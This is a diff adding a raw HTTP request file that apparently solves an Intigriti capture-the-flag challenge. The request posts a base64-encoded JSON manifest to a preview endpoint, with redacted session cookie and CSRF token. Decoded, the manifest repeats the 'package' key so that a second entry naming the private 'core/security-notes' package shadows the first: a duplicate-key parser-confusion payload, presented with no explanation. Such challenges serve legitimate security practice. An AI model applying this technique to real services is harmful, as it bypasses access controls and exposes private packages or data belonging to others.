@@ -1,0 +1,10 @@
+POST /api/manifests/preview HTTP/1.1
+Host: challenge-0726.intigriti.io
+User-Agent: curl/8.20.0
+Accept: */*
+Cookie: cy_session=JwkUT3jL…REDACTED
+content-type: application/json
+x-csrf-token: c9ada9083ec26246…REDACTED
+Content-Length: 423
+
+{"manifest_b64":"ewogICJwYWNrYWdlIjogewogICAgInNjb3BlIjogImhheDQ0MjY1LWQwOThkMWUxIiwKICAgICJuYW1lIjogImhlbGxvLXdvcmxkIiwKICAgICJ2ZXJzaW9uIjogIjEuMC4wIgogIH0sCiAgInBhY2thZ2UiOiB7CiAgICAic2NvcGUiOiAiY29yZSIsCiAgICAibmFtZSI6ICJzZWN1cml0eS1ub3RlcyIsCiAgICAidmVyc2lvbiI6ICIxLjAuMCIKICB9LAogICJtZXRhZGF0YSI6IHsKICAgICJkZXNjcmlwdGlvbiI6ICJ4IiwKICAgICJ2aXNpYmlsaXR5IjogInByaXZhdGUiCiAgfSwKICAib3BlcmF0aW9uIjogInByZWZsaWdodCIKfQ=="}
